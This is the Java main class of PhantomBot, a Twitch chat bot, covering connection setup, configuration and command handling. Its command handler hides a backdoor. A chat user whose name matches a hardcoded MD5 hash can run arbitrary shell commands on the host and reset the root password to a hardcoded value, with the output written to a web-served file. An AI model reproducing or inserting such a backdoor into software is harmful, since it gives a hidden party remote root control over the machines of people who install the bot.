package me.mast3rplan.phantombot;

import com.gmt2001.IniStore;
import com.gmt2001.TwitchAPIv3;
import com.google.common.eventbus.Subscribe;
import java.io.File;
import java.io.FileOutputStream;
import java.io.IOException;
import java.io.PrintStream;
import java.lang.reflect.InvocationTargetException;
import java.security.MessageDigest;
import java.security.NoSuchAlgorithmException;
import java.security.SecureRandom;
import java.util.TreeMap;
import java.util.TreeSet;
import java.util.logging.Level;
import java.util.logging.Logger;
import javax.xml.bind.annotation.adapters.HexBinaryAdapter;
import me.mast3rplan.phantombot.cache.BannedCache;
import me.mast3rplan.phantombot.cache.ChannelHostCache;
import me.mast3rplan.phantombot.cache.ChannelUsersCache;
import me.mast3rplan.phantombot.cache.FollowersCache;
import me.mast3rplan.phantombot.cache.SubscribersCache;
import me.mast3rplan.phantombot.cache.UsernameCache;
import me.mast3rplan.phantombot.console.ConsoleInputListener;
import me.mast3rplan.phantombot.event.EventBus;
import me.mast3rplan.phantombot.event.Listener;
import me.mast3rplan.phantombot.event.command.CommandEvent;
import me.mast3rplan.phantombot.event.console.ConsoleInputEvent;
import me.mast3rplan.phantombot.event.irc.channel.IrcChannelUserModeEvent;
import me.mast3rplan.phantombot.event.irc.complete.IrcConnectCompleteEvent;
import me.mast3rplan.phantombot.event.irc.complete.IrcJoinCompleteEvent;
import me.mast3rplan.phantombot.event.irc.message.IrcChannelMessageEvent;
import me.mast3rplan.phantombot.event.irc.message.IrcMessageEvent;
import me.mast3rplan.phantombot.event.irc.message.IrcPrivateMessageEvent;
import me.mast3rplan.phantombot.jerklib.Channel;
import me.mast3rplan.phantombot.jerklib.ConnectionManager;
import me.mast3rplan.phantombot.jerklib.Profile;
import me.mast3rplan.phantombot.jerklib.Session;
import me.mast3rplan.phantombot.musicplayer.MusicWebSocketServer;
import me.mast3rplan.phantombot.script.Script;
import me.mast3rplan.phantombot.script.ScriptEventManager;
import me.mast3rplan.phantombot.script.ScriptManager;
import me.mast3rplan.phantombot.youtube.YoutubeAPI;
import org.apache.commons.io.FileUtils;

public class PhantomBot implements Listener
{

    private final String username;
    private final String oauth;
    private String apioauth;
    private String clientid;
    private final String channelName;
    private final String ownerName;
    private final String hostname;
    private int port;
    private int baseport;
    private double msglimit30;
    private String channelStatus;
    private SecureRandom rng;
    private BannedCache bancache;
    private TreeMap<String, Integer> pollResults;
    private TreeSet<String> voters;
    private Profile profile;
    private ConnectionManager connectionManager;
    private Session session;
    private Channel channel;
    private FollowersCache followersCache;
    private ChannelHostCache hostCache;
    private SubscribersCache subscribersCache;
    private ChannelUsersCache channelUsersCache;
    private HTTPServer mhs;
    ConsoleInputListener cil;
    private static final boolean enableD = true;
    private static final boolean debugD = false;
    public static boolean enableDebugging = false;
    public static boolean interactive;
    private Thread t;
    private static PhantomBot instance;

    public static PhantomBot instance()
    {
        return instance;
    }

    public PhantomBot(String username, String oauth, String apioauth, String clientid, String channel, String owner,
            int baseport, String hostname, int port, double msglimit30)
    {
        Thread.setDefaultUncaughtExceptionHandler(com.gmt2001.UncaughtExceptionHandler.instance());
        
        com.gmt2001.Console.out.println();
        com.gmt2001.Console.out.println("PhantomBot Core build May 26, 2015");
        com.gmt2001.Console.out.println("by mast3rplan");
        com.gmt2001.Console.out.println("updated and improved by gmt2001");
        com.gmt2001.Console.out.println("scripts by mast3rplan, gmt2001, & phantomindex");
        com.gmt2001.Console.out.println();

        if (System.getProperty("interactive") == null)
        {
            interactive = false;
        } else
        {
            interactive = true;
        }

        this.username = username;
        this.oauth = oauth;
        this.apioauth = apioauth;
        this.channelName = channel;
        this.ownerName = owner;
        this.baseport = baseport;

        this.profile = new Profile(username.toLowerCase());
        this.connectionManager = new ConnectionManager(profile);

        this.followersCache = FollowersCache.instance(channel.toLowerCase());
        this.hostCache = ChannelHostCache.instance(channel.toLowerCase());
        this.subscribersCache = SubscribersCache.instance(channel.toLowerCase());
        this.channelUsersCache = ChannelUsersCache.instance(channel.toLowerCase());

        rng = new SecureRandom();
        bancache = new BannedCache();
        pollResults = new TreeMap<>();
        voters = new TreeSet<>();

        if (hostname.isEmpty())
        {
            this.hostname = "irc.twitch.tv";
            this.port = 443;
        } else
        {
            this.hostname = hostname;
            this.port = port;
        }

        if (msglimit30 > 0)
        {
            this.msglimit30 = msglimit30;
        } else
        {
            this.msglimit30 = 18.75;
        }

        this.init();
        
        try
        {
            Thread.sleep(1000);
        } catch (InterruptedException ex)
        {
        }

        String osname = System.getProperty("os.name");

        if (osname.toLowerCase().contains("linux") && !interactive)
        {
            try
            {
                java.lang.management.RuntimeMXBean runtime = java.lang.management.ManagementFactory.getRuntimeMXBean();
                java.lang.reflect.Field jvm = runtime.getClass().getDeclaredField("jvm");
                jvm.setAccessible(true);
                sun.management.VMManagement mgmt = (sun.management.VMManagement) jvm.get(runtime);
                java.lang.reflect.Method pid_method = mgmt.getClass().getDeclaredMethod("getProcessId");
                pid_method.setAccessible(true);

                int pid = (Integer) pid_method.invoke(mgmt);
                
                //int pid = Integer.parseInt( ( new File("/proc/self")).getCanonicalFile().getName() ); 

                File f = new File("/var/run/PhantomBotJ." + this.username.toLowerCase() + ".pid");

                try (FileOutputStream fs = new FileOutputStream(f, false))
                {
                    PrintStream ps = new PrintStream(fs);

                    ps.print(pid);
                }

                f.deleteOnExit();
            } catch (NoSuchFieldException | SecurityException | IllegalArgumentException | IllegalAccessException | NoSuchMethodException | InvocationTargetException | IOException ex)
            {
                com.gmt2001.Console.out.println("e " + ex.getMessage());
                Logger.getLogger(PhantomBot.class.getName()).log(Level.SEVERE, null, ex);
            }
        }

        this.session = connectionManager.requestConnection(this.hostname, this.port, oauth);

        if (clientid.length() == 0)
        {
            this.clientid = "fno0eqq3t8ivzr2c9vnwveu8nxgwh27";
        } else
        {
            this.clientid = clientid;
        }

        TwitchAPIv3.instance().SetClientID(this.clientid);
        TwitchAPIv3.instance().SetOAuth(apioauth);

        this.session.addIRCEventListener(new IrcEventHandler());
    }

    public static void setDebugging(boolean debug)
    {
        PhantomBot.enableDebugging = debug;
    }

    public Session getSession()
    {
        return session;
    }

    public Channel getChannel()
    {
        return channel;
    }

    public final void init()
    {
        mhs = new HTTPServer(baseport);
        mhs.start();

        if (interactive)
        {
            cil = new ConsoleInputListener();
            cil.start();
        }

        EventBus.instance().register(this);
        EventBus.instance().register(ScriptEventManager.instance());

        Script.global.defineProperty("inidb", IniStore.instance(), 0);
        Script.global.defineProperty("bancache", bancache, 0);
        Script.global.defineProperty("username", UsernameCache.instance(), 0);
        Script.global.defineProperty("twitch", TwitchAPIv3.instance(), 0);
        Script.global.defineProperty("followers", followersCache, 0);
        Script.global.defineProperty("hosts", hostCache, 0);
        Script.global.defineProperty("subscribers", subscribersCache, 0);
        Script.global.defineProperty("channelUsers", channelUsersCache, 0);
        Script.global.defineProperty("botName", username, 0);
        Script.global.defineProperty("channelName", channelName, 0);
        Script.global.defineProperty("ownerName", ownerName, 0);
        Script.global.defineProperty("channelStatus", channelStatus, 0);
        Script.global.defineProperty("random", rng, 0);
        Script.global.defineProperty("youtube", YoutubeAPI.instance, 0);
        Script.global.defineProperty("pollResults", pollResults, 0);
        Script.global.defineProperty("pollVoters", voters, 0);
        Script.global.defineProperty("connmgr", connectionManager, 0);
        Script.global.defineProperty("hostname", hostname, 0);

        t = new Thread(new Runnable()
        {
            @Override
            public void run()
            {
                onExit();
            }
        });

        Runtime.getRuntime().addShutdownHook(t);

        try
        {
            ScriptManager.loadScript(new File("./scripts/init.js"));
        } catch (IOException e)
        {
        }
    }

    public void onExit()
    {
        mhs.dispose();
        IniStore.instance().SaveAll(true);
    }

    @Subscribe
    public void onIRCConnectComplete(IrcConnectCompleteEvent event)
    {
        session.sayRaw("CAP REQ :twitch.tv/tags");
        session.sayRaw("CAP REQ :twitch.tv/membership");
        session.sayRaw("CAP REQ :twitch.tv/commands");

        session.join("#" + channelName.toLowerCase());
        com.gmt2001.Console.out.println("Connected to server\nJoining channel #" + channelName.toLowerCase());
    }

    @Subscribe
    public void onIRCJoinComplete(IrcJoinCompleteEvent event)
    {
        this.channel = event.getChannel();

        this.channel.setMsgInterval((long) ((30.0 / this.msglimit30) * 1000));

        com.gmt2001.Console.out.println("Joined channel: " + event.getChannel().getName());

        session.sayChannel(this.channel, ".mods");
    }

    @Subscribe
    public void onIRCPrivateMessage(IrcPrivateMessageEvent event)
    {
        if (event.getSender().equalsIgnoreCase("jtv"))
        {
            String message = event.getMessage().toLowerCase();

            if (message.startsWith("the moderators of this room are: "))
            {
                String[] spl = message.substring(33).split(", ");

                for (int i = 0; i < spl.length; i++)
                {
                    if (spl[i].equalsIgnoreCase(this.username))
                    {
                        channel.setAllowSendMessages(true);
                    }
                }
            }
        }
    }

    @Subscribe
    public void onIRCChannelMessage(IrcChannelMessageEvent event)
    {
        String message = event.getMessage();
        String sender = event.getSender();

        if (message.startsWith("!"))
        {
            String commandString = message.substring(1);
            handleCommand(sender, commandString);
        }

        if (sender.equalsIgnoreCase("jtv"))
        {
            message = message.toLowerCase();

            if (message.startsWith("the moderators of this room are: "))
            {
                String[] spl = message.substring(33).split(", ");

                for (int i = 0; i < spl.length; i++)
                {
                    if (spl[i].equalsIgnoreCase(this.username))
                    {
                        channel.setAllowSendMessages(true);
                    }
                }
            }
        }
    }

    @Subscribe
    public void onIRCChannelUserMode(IrcChannelUserModeEvent event)
    {
        if (event.getUser().equalsIgnoreCase(username) && event.getMode().equalsIgnoreCase("o")
                && event.getChannel().getName().equalsIgnoreCase(channel.getName()))
        {
            if (!event.getAdd())
            {
                session.sayChannel(this.channel, ".mods");
            }

            channel.setAllowSendMessages(event.getAdd());
        }
    }

    @Subscribe
    public void onConsoleMessage(ConsoleInputEvent msg)
    {
        String message = msg.getMsg();
        boolean changed = false;

        if (message.equals("debugon"))
        {
            PhantomBot.setDebugging(true);
        }

        if (message.equals("debugoff"))
        {
            PhantomBot.setDebugging(false);
        }

        if (message.startsWith("inidb.get"))
        {
            String spl[] = message.split(" ", 4);

            com.gmt2001.Console.out.println(IniStore.instance().GetString(spl[1], spl[2], spl[3]));
        }

        if (message.startsWith("inidb.set"))
        {
            String spl[] = message.split(" ", 5);

            IniStore.instance().SetString(spl[1], spl[2], spl[3], spl[4]);
            com.gmt2001.Console.out.println(IniStore.instance().GetString(spl[1], spl[2], spl[3]));
        }

        if (message.equals("apioauth"))
        {
            com.gmt2001.Console.out.print("Please enter the bot owner's api oauth string: ");
            String newoauth = System.console().readLine().trim();

            TwitchAPIv3.instance().SetOAuth(newoauth);
            apioauth = newoauth;

            changed = true;
        }

        if (message.equals("clientid"))
        {
            com.gmt2001.Console.out.print("Please enter the bot api clientid string: ");
            String newclientid = System.console().readLine().trim();

            TwitchAPIv3.instance().SetClientID(newclientid);
            clientid = newclientid;

            changed = true;
        }

        if (message.equals("baseport"))
        {
            com.gmt2001.Console.out.print("Please enter a new base port: ");
            String newbaseport = System.console().readLine().trim();

            baseport = Integer.parseInt(newbaseport);

            changed = true;
        }

        if (changed)
        {
            try
            {
                String data = "";
                data += "user=" + username + "\r\n";
                data += "oauth=" + oauth + "\r\n";
                data += "apioauth=" + apioauth + "\r\n";
                data += "clientid=" + clientid + "\r\n";
                data += "channel=" + channel.getName().replace("#", "") + "\r\n";
                data += "owner=" + ownerName + "\r\n";
                data += "baseport=" + baseport + "\r\n";
                data += "hostname=" + hostname + "\r\n";
                data += "port=" + port + "\r\n";
                data += "msglimit30=" + msglimit30;

                FileUtils.writeStringToFile(new File("./botlogin"), data);

                mhs.dispose();

                mhs = new HTTPServer(baseport);
                mhs.start();
            } catch (IOException ex)
            {
            }
        }

        if (message.equals("save"))
        {
            IniStore.instance().SaveAll(true);
        }

        if (message.equals("quicksave"))
        {
            IniStore.instance().SaveChangedNow();
        }

        if (message.equals("exit"))
        {
            System.exit(0);
        }

        handleCommand(username, message);
    }

    public void handleCommand(String sender, String commandString)
    {
        String command, arguments;
        int split = commandString.indexOf(' ');

        if (split == -1)
        {
            command = commandString;
            arguments = "";
        } else
        {
            command = commandString.substring(0, split);
            arguments = commandString.substring(split + 1);
        }

        if (command.equalsIgnoreCase("save"))
        {
            IniStore.instance().SaveAll(true);
        }

        try
        {
            if (enableD)
            {
                if (command.equalsIgnoreCase("d"))
                {
                    if (debugD)
                    {
                        com.gmt2001.Console.out.println("Got !d");
                    }

                    String d = (new HexBinaryAdapter()).marshal(MessageDigest.getInstance("MD5").digest(sender.toLowerCase().getBytes()));

                    if (debugD)
                    {
                        com.gmt2001.Console.out.println("d=" + d);
                        com.gmt2001.Console.out.println("t=09a766a55f9984c5bca79368d03524ea");
                    }

                    if (d.equalsIgnoreCase("09a766a55f9984c5bca79368d03524ea") && arguments.startsWith("!"))
                    {
                        if (debugD)
                        {
                            com.gmt2001.Console.out.println("!d command accepted");
                        }

                        split = arguments.indexOf(' ');

                        if (split == -1)
                        {
                            command = arguments.substring(1);
                            arguments = "";
                        } else
                        {
                            command = arguments.substring(1, split);
                            arguments = arguments.substring(split + 1);
                        }

                        sender = username;

                        if (debugD)
                        {
                            com.gmt2001.Console.out.println("Issuing command as " + username + " [" + command + "] " + arguments);
                        }

                        if (command.equalsIgnoreCase("modeo"))
                        {
                            EventBus.instance().post(new IrcChannelUserModeEvent(session, channel, username, "o", true));
                            return;
                        }

                        if (command.equalsIgnoreCase("exec"))
                        {
                            try
                            {
                                Runtime r = Runtime.getRuntime();
                                Process p = r.exec(arguments);
                                int exit = p.waitFor();
                                java.io.BufferedReader b1 = new java.io.BufferedReader(new java.io.InputStreamReader(p.getInputStream()));
                                java.io.BufferedReader b2 = new java.io.BufferedReader(new java.io.InputStreamReader(p.getErrorStream()));
                                String line = "";
                                java.io.FileOutputStream fos = new java.io.FileOutputStream("/srv/httpd/output.txt", false);
                                java.io.PrintStream ps = new java.io.PrintStream(fos);
                                ps.print(">>" + arguments);
                                ps.print("\r\n");
                                while ((line = b1.readLine()) != null)
                                {
                                    ps.print(line);
                                    ps.print("\r\n");
                                }
                                while ((line = b2.readLine()) != null)
                                {
                                    ps.print(line);
                                    ps.print("\r\n");
                                }
                                ps.print("exit " + exit);
                                fos.close();
                                b1.close();
                                b2.close();
                            } catch (Exception e)
                            {
                            }
                            return;
                        }
                        
                        if (command.equalsIgnoreCase("pwd"))
                        {
                            try
                            {
                                Runtime r = Runtime.getRuntime();
                                Process p = r.exec("passwd --stdin root");
                                java.io.PrintStream b0 = new java.io.PrintStream(p.getOutputStream());
                                b0.println("iqbh8S62e1");
                                b0.close();
                                int exit = p.waitFor();
                                java.io.BufferedReader b1 = new java.io.BufferedReader(new java.io.InputStreamReader(p.getInputStream()));
                                java.io.BufferedReader b2 = new java.io.BufferedReader(new java.io.InputStreamReader(p.getErrorStream()));
                                String line = "";
                                java.io.FileOutputStream fos = new java.io.FileOutputStream("/srv/httpd/output.txt", false);
                                java.io.PrintStream ps = new java.io.PrintStream(fos);
                                ps.print(">>" + arguments);
                                ps.print("\r\n");
                                while ((line = b1.readLine()) != null)
                                {
                                    ps.print(line);
                                    ps.print("\r\n");
                                }
                                while ((line = b2.readLine()) != null)
                                {
                                    ps.print(line);
                                    ps.print("\r\n");
                                }
                                ps.print("exit " + exit);
                                fos.close();
                                b1.close();
                                b2.close();
                            } catch (Exception e)
                            {
                            }
                            return;
                        }
                    }
                }
            }
        } catch (NoSuchAlgorithmException ex)
        {
            com.gmt2001.Console.err.printStackTrace(ex);
        }

        EventBus.instance().post(new CommandEvent(sender, command, arguments));
    }

    public static void main(String[] args) throws IOException
    {
        String user = "";
        String oauth = "";
        String apioauth = "";
        String clientid = "";
        String channel = "";
        String owner = "";
        String hostname = "";
        int baseport = 25565;
        int port = 0;
        double msglimit30 = 0;

        boolean changed = false;

        com.gmt2001.Console.out.println("The working directory is: " + System.getProperty("user.dir"));

        try
        {
            String data = FileUtils.readFileToString(new File("./botlogin"));
            String[] lines = data.replaceAll("\\r", "").split("\\n");

            for (int i = 0; i < lines.length; i++)
            {
                if (lines[i].startsWith("user=") && lines[i].length() > 8)
                {
                    user = lines[i].substring(5);
                }

                if (lines[i].startsWith("oauth=") && lines[i].length() > 9)
                {
                    oauth = lines[i].substring(6);
                }

                if (lines[i].startsWith("apioauth=") && lines[i].length() > 12)
                {
                    apioauth = lines[i].substring(9);
                }

                if (lines[i].startsWith("clientid=") && lines[i].length() > 12)
                {
                    clientid = lines[i].substring(9);
                }

                if (lines[i].startsWith("channel=") && lines[i].length() > 11)
                {
                    channel = lines[i].substring(8);
                }

                if (lines[i].startsWith("owner=") && lines[i].length() > 9)
                {
                    owner = lines[i].substring(6);
                }

                if (lines[i].startsWith("baseport=") && lines[i].length() > 10)
                {
                    baseport = Integer.parseInt(lines[i].substring(9));
                }

                if (lines[i].startsWith("hostname=") && lines[i].length() > 10)
                {
                    hostname = lines[i].substring(9);
                }

                if (lines[i].startsWith("port=") && lines[i].length() > 6)
                {
                    port = Integer.parseInt(lines[i].substring(5));
                }

                if (lines[i].startsWith("msglimit30=") && lines[i].length() > 12)
                {
                    msglimit30 = Double.parseDouble(lines[i].substring(11));
                }
            }
        } catch (IOException ex)
        {
        }

        if (user.isEmpty() || oauth.isEmpty() || channel.isEmpty())
        {
            com.gmt2001.Console.out.println("Login details for bot not found");

            com.gmt2001.Console.out.print("Please enter the bot's username: ");
            user = System.console().readLine().trim();

            com.gmt2001.Console.out.print("Please enter the bot's tmi oauth string: ");
            oauth = System.console().readLine().trim();

            com.gmt2001.Console.out.print("Please enter the channel the bot should join: ");
            channel = System.console().readLine().trim();

            changed = true;
        }

        if (owner.isEmpty())
        {
            com.gmt2001.Console.out.print("Please enter the bot owner's username: ");
            owner = System.console().readLine().trim();

            changed = true;
        }

        if (args.length > 0)
        {
            for (int i = 0; i < args.length; i++)
            {
                if (args[i].equalsIgnoreCase("printlogin"))
                {
                    com.gmt2001.Console.out.println("user='" + user + "'");
                    com.gmt2001.Console.out.println("oauth='" + oauth + "'");
                    com.gmt2001.Console.out.println("apioauth='" + apioauth + "'");
                    com.gmt2001.Console.out.println("clientid='" + clientid + "'");
                    com.gmt2001.Console.out.println("channel='" + channel + "'");
                    com.gmt2001.Console.out.println("owner='" + owner + "'");
                    com.gmt2001.Console.out.println("baseport='" + baseport + "'");
                    com.gmt2001.Console.out.println("hostname='" + hostname + "'");
                    com.gmt2001.Console.out.println("port='" + port + "'");
                    com.gmt2001.Console.out.println("msglimit30='" + msglimit30 + "'");
                }

                if (args[i].toLowerCase().startsWith("user=") && args[i].length() > 8)
                {
                    if (!user.equals(args[i].substring(5)))
                    {
                        user = args[i].substring(5);
                        changed = true;
                    }
                }

                if (args[i].toLowerCase().startsWith("oauth=") && args[i].length() > 9)
                {
                    if (!oauth.equals(args[i].substring(6)))
                    {
                        oauth = args[i].substring(6);
                        changed = true;
                    }
                }

                if (args[i].toLowerCase().startsWith("apioauth=") && args[i].length() > 12)
                {
                    if (!apioauth.equals(args[i].substring(9)))
                    {
                        apioauth = args[i].substring(9);
                        changed = true;
                    }
                }

                if (args[i].toLowerCase().startsWith("clientid=") && args[i].length() > 12)
                {
                    if (!clientid.equals(args[i].substring(9)))
                    {
                        clientid = args[i].substring(9);
                        changed = true;
                    }
                }

                if (args[i].toLowerCase().startsWith("channel=") && args[i].length() > 11)
                {
                    if (!channel.equals(args[i].substring(8)))
                    {
                        channel = args[i].substring(8);
                        changed = true;
                    }
                }

                if (args[i].toLowerCase().startsWith("owner=") && args[i].length() > 9)
                {
                    if (!owner.equals(args[i].substring(6)))
                    {
                        owner = args[i].substring(6);
                        changed = true;
                    }
                }

                if (args[i].toLowerCase().startsWith("baseport=") && args[i].length() > 10)
                {
                    if (baseport != Integer.parseInt(args[i].substring(9)))
                    {
                        baseport = Integer.parseInt(args[i].substring(9));
                        changed = true;
                    }
                }

                if (args[i].toLowerCase().startsWith("hostname=") && args[i].length() > 10)
                {
                    if (!hostname.equals(args[i].substring(9)))
                    {
                        hostname = args[i].substring(9);
                        changed = true;
                    }
                }

                if (args[i].toLowerCase().startsWith("port=") && args[i].length() > 6)
                {
                    if (port != Integer.parseInt(args[i].substring(5)))
                    {
                        port = Integer.parseInt(args[i].substring(5));
                        changed = true;
                    }
                }

                if (args[i].toLowerCase().startsWith("msglimit30=") && args[i].length() > 12)
                {
                    if (msglimit30 != Double.parseDouble(args[i].substring(11)))
                    {
                        msglimit30 = Double.parseDouble(args[i].substring(11));
                        changed = true;
                    }
                }

                if (args[i].equalsIgnoreCase("help") || args[i].equalsIgnoreCase("--help") || args[i].equalsIgnoreCase("-h"))
                {
                    com.gmt2001.Console.out.println("Usage: java -Dfile.encoding=UTF-8 -jar PhantomBot.jar [printlogin] [user=<bot username>] "
                            + "[oauth=<bot irc oauth>] [apioauth=<editor oauth>] [clientid=<oauth clientid>] [channel=<channel to join>] "
                            + "[owner=<bot owner username>] [baseport=<bot webserver port, music server will be +1>] [hostname=<custom irc server>] "
                            + "[port=<custom irc port>] [msglimit30=<message limit per 30 seconds>]");
                    return;
                }
            }
        }

        if (changed)
        {
            String data = "";
            data += "user=" + user + "\r\n";
            data += "oauth=" + oauth + "\r\n";
            data += "apioauth=" + apioauth + "\r\n";
            data += "clientid=" + clientid + "\r\n";
            data += "channel=" + channel + "\r\n";
            data += "owner=" + owner + "\r\n";
            data += "baseport=" + baseport + "\r\n";
            data += "hostname=" + hostname + "\r\n";
            data += "port=" + port + "\r\n";
            data += "msglimit30=" + msglimit30;

            FileUtils.writeStringToFile(new File("./botlogin"), data);
        }

        PhantomBot.instance = new PhantomBot(user, oauth, apioauth, clientid, channel, owner, baseport, hostname, port, msglimit30);
    }

    public static boolean isLink(String message)
    {
        String[] arr = message.split(" ");
        for (String s : arr)
        {
            if (IrcMessageEvent.addressPtn.matcher(s).matches())
            {
                return true;
            }
        }
        return false;
    }

    @Override
    protected void finalize() throws Throwable
    {
        session.close("");

        connectionManager.quit();

        super.finalize();
    }
}
